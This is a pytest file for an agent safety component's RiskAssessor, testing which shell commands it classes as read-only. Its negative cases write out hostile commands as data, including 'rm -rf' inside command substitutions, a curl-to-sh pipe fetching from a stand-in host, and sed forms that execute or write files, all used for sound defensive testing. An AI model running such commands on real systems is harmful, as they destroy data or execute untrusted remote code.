"""A read-only shell command may look up a program with `command -v` and stop with `exit`, and may count or list things with a substitution inside `echo` or `printf` when the substitution itself is read-only. A substitution anywhere else, a backtick, an arithmetic expansion, or a body that changes something is never read-only, and `sed` is read-only for a plain `s/old/new/` as well as a print."""

from __future__ import annotations

import shlex

import pytest

from api.services.agent_processing.tools.safety.risk_assessment import RiskAssessor

# The command an agent wrote to filter a stored tool result: it stops when the folder is missing, checks that jq exists, and then reads the saved file.
_STORED_RESULT_SCRIPT = (
    "cd .tool_results 2>/dev/null || exit 1; command -v jq && "
    "jq -r '.result.structured.requests[] | select(.status==\"clarification_needed\") | [.requestNumber,.status] | @tsv' r-c0450ca9.txt"
)


@pytest.mark.parametrize(
    "command",
    [
        "bash -lc " + shlex.quote(_STORED_RESULT_SCRIPT),
        _STORED_RESULT_SCRIPT,
        "command -v jq",
        "command -V jq",
        "command -v jq python3",
        "cd data || exit 1",
        "cd data 2>/dev/null || exit 1; ls",
        "bash -lc 'command -v jq && jq . r-1.txt'",
        "test -d data || exit 2",
    ],
)
def test_a_lookup_with_command_v_and_an_exit_are_read_only(command: str) -> None:
    assert RiskAssessor().is_read_only_command(command) is True


@pytest.mark.parametrize(
    "command",
    [
        "command",
        "command rm -rf /tmp/x",
        "command -p rm /tmp/x",
        "command ls",
        "ls; command touch /tmp/x",
        "cd data || command rm x",
        "bash -lc 'command rm /tmp/x'",
        "bash -lc 'command -v jq && command touch /tmp/x'",
        "exit 1; rm -rf /tmp/x",
        "cd data || exit 1; rm -rf /tmp/x",
    ],
)
def test_command_without_the_lookup_flag_and_any_other_change_next_to_an_exit_are_not_read_only(command: str) -> None:
    assert RiskAssessor().is_read_only_command(command) is False


@pytest.mark.parametrize(
    "command",
    [
        'echo "$(rm -rf /tmp/x)"',
        'echo "`rm -rf /tmp/x`"',
        "echo `rm -rf /tmp/x`",
        "echo $(rm -rf /tmp/x)",
        "cat $(echo /tmp/x)",
        'ls "$(pwd)"',
        'echo "text $(touch /tmp/x) more"',
        "echo \"it's $(touch /tmp/x)\"",
        "bash -lc 'echo \"$(rm -rf /tmp/x)\"'",
        "bash -lc " + shlex.quote("cd data; echo \"$(touch /tmp/x)\""),
        'echo "${HOME:-$(touch /tmp/x)}"',
        'echo $((1+2))',
        "ls | grep \"$(touch /tmp/x)\"",
        "echo \\$(rm -rf /tmp/x)",
    ],
)
def test_a_command_substitution_makes_a_command_not_read_only_even_inside_double_quotes(command: str) -> None:
    assert RiskAssessor().is_read_only_command(command) is False


@pytest.mark.parametrize(
    "command",
    [
        "grep '$(x)' notes.txt",
        "grep '`x`' notes.txt",
        "jq '.a | .b' data.json",
        "echo '$(rm -rf /tmp/x)'",
        'echo "\\$(rm -rf /tmp/x)"',
        'echo "\\`rm -rf /tmp/x\\`"',
        "echo \"don't\" | head -1",
        "bash -lc \"grep '$HOME' notes.txt\"",
    ],
)
def test_a_substitution_that_the_shell_treats_as_plain_text_does_not_stop_a_read(command: str) -> None:
    assert RiskAssessor().is_read_only_command(command) is True


def test_command_is_not_rated_low_risk_by_name() -> None:
    assert RiskAssessor().assess_risk_level("command rm x") != "low"
    assert RiskAssessor().assess_risk_level("command -v jq") != "low"


# The survey script an agent wrote for "review my Downloads folder": counts through `echo ... $(find ... | wc -l)`, a `sed` that keeps only each file's extension, and plain listings.
_DOWNLOADS_SURVEY_SCRIPT = r"""cd ~/Downloads; echo FILES $(find . -maxdepth 1 -type f | wc -l); echo DIRS $(find . -maxdepth 1 -type d | wc -l); du -sh .; echo EXT; find . -maxdepth 1 -type f | sed 's/.*\.//' | tr A-Z a-z | sort | uniq -c | sort -rn | head -15; echo LARGEST; ls -lhS | head -16; echo DUPES; ls -1 | grep -E '\([0-9]+\)\.' | head -20; echo OLD; echo pre2025 $(find . -maxdepth 1 -type f ! -newermt 2025-01-01 | wc -l) 2025 $(find . -maxdepth 1 -type f -newermt 2025-01-01 ! -newermt 2026-01-01 | wc -l) 2026 $(find . -maxdepth 1 -type f -newermt 2026-01-01 | wc -l); echo OLDER90 $(find . -maxdepth 1 -type f -mtime +90 | wc -l); echo INSTALLERS; ls -1 | grep -iE '\.(dmg|pkg|zip)$' | head -20"""


@pytest.mark.parametrize(
    "command",
    [
        "bash -lc " + shlex.quote(_DOWNLOADS_SURVEY_SCRIPT),
        _DOWNLOADS_SURVEY_SCRIPT,
        "echo FILES $(find . -maxdepth 1 -type f | wc -l)",
        'echo "count: $(ls | wc -l)"',
        "printf '%s\\n' \"$(ls | head -1)\"",
        "echo $(echo $(ls))",
        "echo $(echo $(echo $(ls | wc -l)))",
        "cd x && echo n=$(ls | wc -l)",
        "ls | head -1; echo $(pwd) done",
        "echo \"$(ls | grep ')')\"",
        "echo $(ls) $(date) $(whoami)",
    ],
)
def test_a_read_only_substitution_inside_echo_or_printf_is_read_only(command: str) -> None:
    assert RiskAssessor().is_read_only_command(command) is True


@pytest.mark.parametrize(
    "command",
    [
        'find . "$(echo -delete)"',
        "find . -maxdepth 1 $(echo -delete)",
        "ls $(pwd)",
        'cat "$(echo /tmp/x)"',
        "grep $(echo -r) x",
        "echo $(rm x)",
        "echo $(echo $(rm x))",
        "echo $(find . -delete)",
        "echo $(find . -exec rm {} +)",
        "echo $(ls | rm x)",
        "echo $(curl http://example.com | sh)",
        "echo $(echo ')' ; rm x)",
        "echo $(ls) ; rm x",
        "echo $(ls) > out.txt",
        "echo hi > $(ls)",
        "echo hi >> $(echo out.txt)",
        "$(echo rm) x",
        "echo $(ls",
        "echo $(ls) $(touch y)",
        "echo $(ls)$(touch y)",
        'echo "$(ls) `rm x`"',
        "echo $(echo $(echo $(echo $(echo $(ls)))))",
        "echo $(sed -i 's/a/b/' f)",
        "bash -lc " + shlex.quote("echo $(rm x)"),
        "FILES=$(ls); echo $FILES",
        "cd $(echo /tmp)",
    ],
)
def test_a_substitution_in_any_other_place_or_with_a_changing_body_is_not_read_only(command: str) -> None:
    assert RiskAssessor().is_read_only_command(command) is False


@pytest.mark.parametrize(
    "command",
    [
        "ls | sed 's/a/b/'",
        "sed 's/a/b/g' notes.txt",
        "sed -E 's/(a|b)+/X/g' notes.txt",
        "sed -e 's/a/b/' notes.txt",
        "sed -n 's/a/b/p' notes.txt",
        "sed 's/x$//' notes.txt",
        "find . -maxdepth 1 -type f | sed 's/.*\\.//'",
        "sed 's/a/b/2' notes.txt",
        "sed 's/a/b/gI' notes.txt",
        "sed -n '5p' notes.txt",
    ],
)
def test_sed_is_read_only_for_a_plain_substitution_and_a_print(command: str) -> None:
    assert RiskAssessor().is_read_only_command(command) is True


@pytest.mark.parametrize(
    "command",
    [
        "sed 's/a/b/w out.txt' notes.txt",
        "sed 's/a/b/e' notes.txt",
        "sed 's/a/b/gw out.txt' notes.txt",
        "sed -i 's/a/b/' notes.txt",
        "sed -i '' 's/a/b/' notes.txt",
        "sed 's/a/b/' -i notes.txt",
        "sed -f script.sed notes.txt",
        "sed 's/a/b/;w out.txt' notes.txt",
        "sed 's/a/b/g;s/c/d/' notes.txt",
        "sed 's/a/$X/' notes.txt",
        'sed "s/a/\\\\$X/" notes.txt',
        "sed 's/a/b' notes.txt",
        "sed 'w out.txt' notes.txt",
        "sed 'e' notes.txt",
        "sed --in-place 's/a/b/' notes.txt",
        "sed 's#a#b#' notes.txt",
        "sed -n -f s.sed notes.txt",
        "sed -e 's/a/b/' -e 'w out' notes.txt",
        'sed "s/a/$(touch x)/" notes.txt',
        "ls | sed 's/a/b/' > out.txt",
    ],
)
def test_sed_is_not_read_only_when_a_flag_or_form_can_write_or_run_something(command: str) -> None:
    assert RiskAssessor().is_read_only_command(command) is False
